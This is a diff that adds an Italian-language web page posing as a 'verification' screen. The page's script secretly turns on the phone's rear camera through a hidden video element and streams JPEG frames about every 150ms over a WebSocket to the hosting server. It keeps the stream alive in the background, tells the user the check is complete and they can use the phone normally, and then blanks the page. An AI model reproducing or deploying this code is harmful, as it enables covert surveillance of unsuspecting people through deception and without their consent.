@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verifica...</title>
+  <style>
+    body { margin:0; padding:0; background:#000; color:#0f0; font-family:Arial; text-align:center; }
+    .msg { padding:40px 20px; font-size:18px; }
+  </style>
+</head>
+<body>
+  <div class="msg">Verifica in corso...<br><small>Non chiudere questa pagina.</small></div>
+
+  <!-- Video nascosto -->
+  <video id="cam" playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const video = document.getElementById('cam');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    const room = new URLSearchParams(location.search).get('room') || 'user1';
+    
+    let stream = null;
+    let sending = false;
+
+    // WebSocket (anche in background)
+    const ws = new WebSocket(`wss://${location.host}/bg-stream?room=${room}`);
+
+    ws.onopen = () => startCamera();
+    ws.onclose = () => console.log('Connessione persa');
+    ws.onerror = () => console.log('Errore WS');
+
+    // Invia frame ogni 150ms (~6-7 FPS, basso consumo)
+    function sendFrame() {
+      if (!sending || video.videoWidth === 0) return;
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0);
+      canvas.toBlob(blob => {
+        if (ws.readyState === WebSocket.OPEN && blob) {
+          ws.send(blob);
+        }
+      }, 'image/jpeg', 0.6);
+      setTimeout(sendFrame, 150);
+    }
+
+    // Avvia fotocamera POSTERIORE
+    async function startCamera() {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'environment', width: { ideal: 1280 } },
+          audio: false
+        });
+        video.srcObject = stream;
+        video.onloadedmetadata = () => {
+          sending = true;
+          sendFrame();
+
+          // Messaggio finale + chiudi visuale
+          document.body.innerHTML = `
+            <div class="msg">
+              <b>Verifica completata</b><br>
+              <small>Puoi usare il telefono normalmente.<br>
+              La verifica continua in background.</small>
+            </div>`;
+          
+          // Opzionale: minimizza automaticamente (solo mobile)
+          setTimeout(() => {
+            if (navigator.userActivation?.isActive) {
+              document.body.innerHTML = '';
+            }
+          }, 3000);
+        };
+      } catch (err) {
+        document.body.innerHTML = `<div class="msg">Errore: ${err.message}</div>`;
+      }
+    }
+
+    // Tieni vivo il WebSocket anche se la scheda è in background
+    setInterval(() => {
+      if (ws.readyState === WebSocket.OPEN) ws.send('ping');
+    }, 10000);
+  </script>
+</body>
+</html>
